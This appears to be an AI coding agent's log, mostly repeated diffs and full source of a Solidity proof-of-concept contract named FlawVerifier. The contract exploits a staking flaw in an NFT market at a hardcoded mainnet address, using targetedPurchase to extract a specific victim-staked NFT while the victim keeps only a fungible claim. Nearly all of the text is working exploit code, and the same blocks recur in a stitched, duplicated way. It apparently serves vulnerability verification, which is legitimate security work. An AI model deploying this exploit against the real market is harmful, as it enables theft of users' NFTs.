+            : 0;
+
+        // Exploit path 2:
+        // the victim no longer owns the original NFT, but the market still records only a
+        // fungible 1 ether staking claim for that victim helper address.
+        victimAccountingClaim = _victimClaim(victim);
+        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
+            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+            return;
+        }
+
+        hypothesisValidated = true;
+        _profitAmount = 0;
+        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+    }
+
+    function profitToken() external view returns (address) {
+        if (_profitToken != address(0)) {
+            return _profitToken;
+        }
+        return IMarketLike(MARKET).ruggedToken();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _stageVictimStake(address rugged) internal returns (uint256) {
+        uint256 tokenId = _findOwnedToken(rugged, address(this));
+
+        // If the verifier does not already hold a Rugged NFT, source one through a real public
+        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
+        // the root cause remains that staking moves the NFT into shared inventory that anyone
+        // can later name and extract through `targetedPurchase`.
+        if (tokenId == 0) {
+            tokenId = _bootstrapVictimNFT(rugged);
+        }
+
+        if (tokenId == 0) {
+            return 0;
+        }
+
+        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
+        victim = address(victimContract);
+
+        // Exploit path 0:
+        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
+        // transfers that exact token into the market contract without reserving it.
+        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
+        victimContract.stakeSingle(tokenId);
+
+        if (_ownerOf(rugged, tokenId) != MARKET) {
+            return 0;
+        }
+
+        return tokenId;
+    }
+
+    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
+        uint256 tokenId = _findOwnedToken(rugged, MARKET);
+        if (tokenId == 0) {
+            return 0;
+        }
+
+        uint256 ruggedBalance = _ruggedBalance(rugged);
+        if (ruggedBalance < PRICE_PER_NFT) {
+            return 0;
+        }
+
+        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
+            return 0;
+        }
+
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(MARKET).targetedPurchase(tokenIds);
+
+        if (_ownerOf(rugged, tokenId) != address(this)) {
+            return 0;
+        }
+
+        return tokenId;
+    }
+
+    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
+        if (account == address(0)) {
+            return 0;
+        }
+
+        (bool ok, bytes memory data) = MARKET.staticcall(
+            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
+        );
+        if (!ok || data.length < 64) {
+            return 0;
+        }
+
+        (amountStaked, ) = abi.decode(data, (uint256, uint256));
+    }
+
+    function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+            if (_ownerOf(rugged, tokenId) == owner) {
+                return tokenId;
+            }
+        }
+        return 0;
+    }
+
+    function _ownerOf(address rugged, uint256 tokenId) internal view returns (address owner) {
+        (bool ok, bytes memory data) =
+            rugged.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
+        if (!ok || data.length < 32) {
+            return address(0);
+        }
+        owner = abi.decode(data, (address));
+    }
+
+    function _ruggedBalance(address rugged) internal view returns (uint256) {
+        return IERC20Like(rugged).balanceOf(address(this));
+    }
+
+    function _approveFungible(
+        address token,
+        address spender,
+        uint256 amount
+    ) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        return ok && (data.length == 0 || abi.decode(data, (bool)));
+    }
+
+    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+        if (address(this).balance == 0) {
+            return;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
+        path[1] = rugged;
+
+        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
+            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+            0, path, address(this), block.timestamp
+        ) {} catch {
+            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
+            // only. The PoC must not fabricate capital or mutate state off-path.
+        }
+    }
+}
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..aff8ed95e77ae6762335615964c2b1bcc4beb6d3
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -5,10 +5,14 @@
+     function ruggedToken() external view returns (address);
+     function stakeNFTs(uint256[] calldata tokenIds) external;
+     function targetedPurchase(uint256[] calldata tokenIds) external;
++    function stakers(
++        address account
++    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+ }
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
++    function approve(address spender, uint256 amount) external returns (bool);
+ }
+ 
+ interface IERC404Like {
+@@ -42,8 +46,6 @@
+     function stakeSingle(uint256 tokenId) external {
+         require(msg.sender == controller, "ONLY_CONTROLLER");
+ 
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+         IERC404Like(rugged).approve(market, tokenId);
+ 
+         uint256[] memory tokenIds = new uint256[](1);
+@@ -56,7 +58,9 @@
+     address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+     address public constant UNISWAP_V2_ROUTER =
+         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
++
+     uint256 public constant PRICE_PER_NFT = 1.1 ether;
++    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+     uint256 public constant MAX_TOKEN_ID = 10_000;
+ 
+     address private _profitToken;
+@@ -64,15 +68,16 @@
+ 
+     bool public hypothesisValidated;
+     bool public victimStakeObserved;
++    address public victim;
++    uint256 public victimTokenId;
+     uint256 public acquiredTokenId;
++    uint256 public victimAccountingClaim;
+     uint256 public ruggedSpent;
+     uint256 public ruggedBalanceBefore;
+     uint256 public ruggedBalanceAfter;
+     bytes32 public lastStatus;
+ 
+     event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+ 
+     receive() external payable {}
+ 
+@@ -84,41 +89,52 @@
+         address rugged = IMarketLike(MARKET).ruggedToken();
+         _profitToken = rugged;
+ 
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
++        // direct_or_existing_balance_first:
++        // try to execute using verifier-held assets first. Only if the verifier does not
++        // already hold a Rugged NFT do we use a realistic public purchase to source one.
++        _maybeAcquireRuggedFromHeldETH(rugged);
++
++        uint256 tokenId = _stageVictimStake(rugged);
+         if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
++            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+             emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+             return;
+         }
+ 
+         victimStakeObserved = true;
++        victimTokenId = tokenId;
++        victimAccountingClaim = _victimClaim(victim);
+ 
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
++            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
++            return;
++        }
++
+         _maybeAcquireRuggedFromHeldETH(rugged);
+ 
+         ruggedBalanceBefore = _ruggedBalance(rugged);
+         if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
++            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
++        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+             lastStatus = keccak256("APPROVE_FAILED");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
++        // Exploit path 1:
++        // after the victim stakes a specific NFT into the shared pool, the attacker names
++        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+         uint256[] memory tokenIds = new uint256[](1);
+         tokenIds[0] = tokenId;
+         IMarketLike(MARKET).targetedPurchase(tokenIds);
+ 
+         if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
++            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+             emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+             return;
+         }
+@@ -128,11 +144,18 @@
+         ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+             ? ruggedBalanceBefore - ruggedBalanceAfter
+             : 0;
+-        hypothesisValidated = true;
+ 
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
++        // Exploit path 2:
++        // the victim no longer owns the original NFT, but the market still records only a
++        // fungible 1 ether staking claim for that victim helper address.
++        victimAccountingClaim = _victimClaim(victim);
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
++            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
++            return;
++        }
++
++        hypothesisValidated = true;
+         _profitAmount = 0;
+         lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+         emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+@@ -149,28 +172,78 @@
+         return _profitAmount;
+     }
+ 
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
++    function _stageVictimStake(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, address(this));
+ 
+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
++        // If the verifier does not already hold a Rugged NFT, source one through a real public
++        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
++        // the root cause remains that staking moves the NFT into shared inventory that anyone
++        // can later name and extract through `targetedPurchase`.
++        if (tokenId == 0) {
++            tokenId = _bootstrapVictimNFT(rugged);
++        }
+ 
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
++        if (tokenId == 0) {
++            return 0;
+         }
+ 
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
++        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
++        victim = address(victimContract);
++
++        // Exploit path 0:
++        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
++        // transfers that exact token into the market contract without reserving it.
++        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
++        victimContract.stakeSingle(tokenId);
++
++        if (_ownerOf(rugged, tokenId) != MARKET) {
++            return 0;
++        }
++
++        return tokenId;
+     }
+ 
++    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, MARKET);
++        if (tokenId == 0) {
++            return 0;
++        }
++
++        uint256 ruggedBalance = _ruggedBalance(rugged);
++        if (ruggedBalance < PRICE_PER_NFT) {
++            return 0;
++        }
++
++        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
++            return 0;
++        }
++
++        uint256[] memory tokenIds = new uint256[](1);
++        tokenIds[0] = tokenId;
++        IMarketLike(MARKET).targetedPurchase(tokenIds);
++
++        if (_ownerOf(rugged, tokenId) != address(this)) {
++            return 0;
++        }
++
++        return tokenId;
++    }
++
++    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
++        if (account == address(0)) {
++            return 0;
++        }
++
++        (bool ok, bytes memory data) = MARKET.staticcall(
++            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
++        );
++        if (!ok || data.length < 64) {
++            return 0;
++        }
++
++        (amountStaked, ) = abi.decode(data, (uint256, uint256));
++    }
++
+     function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+         for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+             if (_ownerOf(rugged, tokenId) == owner) {
+@@ -193,14 +266,18 @@
+         return IERC20Like(rugged).balanceOf(address(this));
+     }
+ 
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
++    function _approveFungible(
++        address token,
++        address spender,
++        uint256 amount
++    ) internal returns (bool) {
+         (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
++            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+         return ok && (data.length == 0 || abi.decode(data, (bool)));
+     }
+ 
+     function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
++        if (address(this).balance == 0) {
+             return;
+         }
+ 
+@@ -212,8 +289,8 @@
+             .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+             0, path, address(this), block.timestamp
+         ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
++            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
++            // only. The PoC must not fabricate capital or mutate state off-path.
+         }
+     }
+ }
+
+codex
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IMarketLike {
+    function ruggedToken() external view returns (address);
+    function stakeNFTs(uint256[] calldata tokenIds) external;
+    function targetedPurchase(uint256[] calldata tokenIds) external;
+    function stakers(
+        address account
+    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+}
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IERC404Like {
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
+    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
+}
+
+interface IUniswapV2Router02Like {
+    function WETH() external pure returns (address);
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+}
+
+contract VictimStaker {
+    address public immutable market;
+    address public immutable rugged;
+    address public immutable controller;
+
+    constructor(address _market, address _rugged, address _controller) {
+        market = _market;
+        rugged = _rugged;
+        controller = _controller;
+    }
+
+    function stakeSingle(uint256 tokenId) external {
+        require(msg.sender == controller, "ONLY_CONTROLLER");
+
+        IERC404Like(rugged).approve(market, tokenId);
+
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(market).stakeNFTs(tokenIds);
+    }
+}
+
+contract FlawVerifier {
+    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+    address public constant UNISWAP_V2_ROUTER =
+        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    uint256 public constant PRICE_PER_NFT = 1.1 ether;
+    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+    uint256 public constant MAX_TOKEN_ID = 10_000;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public hypothesisValidated;
+    bool public victimStakeObserved;
+    address public victim;
+    uint256 public victimTokenId;
+    uint256 public acquiredTokenId;
+    uint256 public victimAccountingClaim;
+    uint256 public ruggedSpent;
+    uint256 public ruggedBalanceBefore;
+    uint256 public ruggedBalanceAfter;
+    bytes32 public lastStatus;
+
+    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+
+    receive() external payable {}
+
+    function executeOnOpportunity() public {
+        if (hypothesisValidated) {
+            return;
+        }
+
+        address rugged = IMarketLike(MARKET).ruggedToken();
+        _profitToken = rugged;
+
+        // direct_or_existing_balance_first:
+        // try to execute using verifier-held assets first. Only if the verifier does not
+        // already hold a Rugged NFT do we use a realistic public purchase to source one.
+        _maybeAcquireRuggedFromHeldETH(rugged);
+
+        uint256 tokenId = _stageVictimStake(rugged);
+        if (tokenId == 0) {
+            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+            return;
+        }
+
+        victimStakeObserved = true;
+        victimTokenId = tokenId;
+        victimAccountingClaim = _victimClaim(victim);
+
+        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
+            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
+            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+            return;
+        }
+
+        _maybeAcquireRuggedFromHeldETH(rugged);
+
+        ruggedBalanceBefore = _ruggedBalance(rugged);
+        if (ruggedBalanceBefore < PRICE_PER_NFT) {
+            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+            return;
+        }
+
+        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+            lastStatus = keccak256("APPROVE_FAILED");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+            return;
+        }
+
+        // Exploit path 1:
+        // after the victim stakes a specific NFT into the shared pool, the attacker names
+        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(MARKET).targetedPurchase(tokenIds);
+
+        if (_ownerOf(rugged, tokenId) != address(this)) {
+            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+            return;
+        }
+
+        acquiredTokenId = tokenId;
+        ruggedBalanceAfter = _ruggedBalance(rugged);
+        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+            ? ruggedBalanceBefore - ruggedBalanceAfter
+            : 0;
+
+        // Exploit path 2:
+        // the victim no longer owns the original NFT, but the market still records only a
+        // fungible 1 ether staking claim for that victim helper address.
+        victimAccountingClaim = _victimClaim(victim);
+        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
+            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+            return;
+        }
+
+        hypothesisValidated = true;
+        _profitAmount = 0;
+        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+    }
+
+    function profitToken() external view returns (address) {
+        if (_profitToken != address(0)) {
+            return _profitToken;
+        }
+        return IMarketLike(MARKET).ruggedToken();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _stageVictimStake(address rugged) internal returns (uint256) {
+        uint256 tokenId = _findOwnedToken(rugged, address(this));
+
+        // If the verifier does not already hold a Rugged NFT, source one through a real public
+        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
+        // the root cause remains that staking moves the NFT into shared inventory that anyone
+        // can later name and extract through `targetedPurchase`.
+        if (tokenId == 0) {
+            tokenId = _bootstrapVictimNFT(rugged);
+        }
+
+        if (tokenId == 0) {
+            return 0;
+        }
+
+        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
+        victim = address(victimContract);
+
+        // Exploit path 0:
+        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
+        // transfers that exact token into the market contract without reserving it.
+        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
+        victimContract.stakeSingle(tokenId);
+
+        if (_ownerOf(rugged, tokenId) != MARKET) {
+            return 0;
+        }
+
+        return tokenId;
+    }
+
+    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
+        uint256 tokenId = _findOwnedToken(rugged, MARKET);
+        if (tokenId == 0) {
+            return 0;
+        }
+
+        uint256 ruggedBalance = _ruggedBalance(rugged);
+        if (ruggedBalance < PRICE_PER_NFT) {
+            return 0;
+        }
+
+        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
+            return 0;
+        }
+
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(MARKET).targetedPurchase(tokenIds);
+
+        if (_ownerOf(rugged, tokenId) != address(this)) {
+            return 0;
+        }
+
+        return tokenId;
+    }
+
+    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
+        if (account == address(0)) {
+            return 0;
+        }
+
+        (bool ok, bytes memory data) = MARKET.staticcall(
+            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
+        );
+        if (!ok || data.length < 64) {
+            return 0;
+        }
+
+        (amountStaked, ) = abi.decode(data, (uint256, uint256));
+    }
+
+    function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+            if (_ownerOf(rugged, tokenId) == owner) {
+                return tokenId;
+            }
+        }
+        return 0;
+    }
+
+    function _ownerOf(address rugged, uint256 tokenId) internal view returns (address owner) {
+        (bool ok, bytes memory data) =
+            rugged.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
+        if (!ok || data.length < 32) {
+            return address(0);
+        }
+        owner = abi.decode(data, (address));
+    }
+
+    function _ruggedBalance(address rugged) internal view returns (uint256) {
+        return IERC20Like(rugged).balanceOf(address(this));
+    }
+
+    function _approveFungible(
+        address token,
+        address spender,
+        uint256 amount
+    ) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        return ok && (data.length == 0 || abi.decode(data, (bool)));
+    }
+
+    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+        if (address(this).balance == 0) {
+            return;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
+        path[1] = rugged;
+
+        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
+            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+            0, path, address(this), block.timestamp
+        ) {} catch {
+            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
+            // only. The PoC must not fabricate capital or mutate state off-path.
+        }
+    }
+}
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..aff8ed95e77ae6762335615964c2b1bcc4beb6d3
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -5,10 +5,14 @@
+     function ruggedToken() external view returns (address);
+     function stakeNFTs(uint256[] calldata tokenIds) external;
+     function targetedPurchase(uint256[] calldata tokenIds) external;
++    function stakers(
++        address account
++    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+ }
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
++    function approve(address spender, uint256 amount) external returns (bool);
+ }
+ 
+ interface IERC404Like {
+@@ -42,8 +46,6 @@
+     function stakeSingle(uint256 tokenId) external {
+         require(msg.sender == controller, "ONLY_CONTROLLER");
+ 
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+         IERC404Like(rugged).approve(market, tokenId);
+ 
+         uint256[] memory tokenIds = new uint256[](1);
+@@ -56,7 +58,9 @@
+     address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+     address public constant UNISWAP_V2_ROUTER =
+         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
++
+     uint256 public constant PRICE_PER_NFT = 1.1 ether;
++    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+     uint256 public constant MAX_TOKEN_ID = 10_000;
+ 
+     address private _profitToken;
+@@ -64,15 +68,16 @@
+ 
+     bool public hypothesisValidated;
+     bool public victimStakeObserved;
++    address public victim;
++    uint256 public victimTokenId;
+     uint256 public acquiredTokenId;
++    uint256 public victimAccountingClaim;
+     uint256 public ruggedSpent;
+     uint256 public ruggedBalanceBefore;
+     uint256 public ruggedBalanceAfter;
+     bytes32 public lastStatus;
+ 
+     event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+ 
+     receive() external payable {}
+ 
+@@ -84,41 +89,52 @@
+         address rugged = IMarketLike(MARKET).ruggedToken();
+         _profitToken = rugged;
+ 
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
++        // direct_or_existing_balance_first:
++        // try to execute using verifier-held assets first. Only if the verifier does not
++        // already hold a Rugged NFT do we use a realistic public purchase to source one.
++        _maybeAcquireRuggedFromHeldETH(rugged);
++
++        uint256 tokenId = _stageVictimStake(rugged);
+         if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
++            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+             emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+             return;
+         }
+ 
+         victimStakeObserved = true;
++        victimTokenId = tokenId;
++        victimAccountingClaim = _victimClaim(victim);
+ 
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
++            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
++            return;
++        }
++
+         _maybeAcquireRuggedFromHeldETH(rugged);
+ 
+         ruggedBalanceBefore = _ruggedBalance(rugged);
+         if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
++            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
++        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+             lastStatus = keccak256("APPROVE_FAILED");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
++        // Exploit path 1:
++        // after the victim stakes a specific NFT into the shared pool, the attacker names
++        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+         uint256[] memory tokenIds = new uint256[](1);
+         tokenIds[0] = tokenId;
+         IMarketLike(MARKET).targetedPurchase(tokenIds);
+ 
+         if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
++            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+             emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+             return;
+         }
+@@ -128,11 +144,18 @@
+         ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+             ? ruggedBalanceBefore - ruggedBalanceAfter
+             : 0;
+-        hypothesisValidated = true;
+ 
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
++        // Exploit path 2:
++        // the victim no longer owns the original NFT, but the market still records only a
++        // fungible 1 ether staking claim for that victim helper address.
++        victimAccountingClaim = _victimClaim(victim);
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
++            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
++            return;
++        }
++
++        hypothesisValidated = true;
+         _profitAmount = 0;
+         lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+         emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+@@ -149,28 +172,78 @@
+         return _profitAmount;
+     }
+ 
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
++    function _stageVictimStake(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, address(this));
+ 
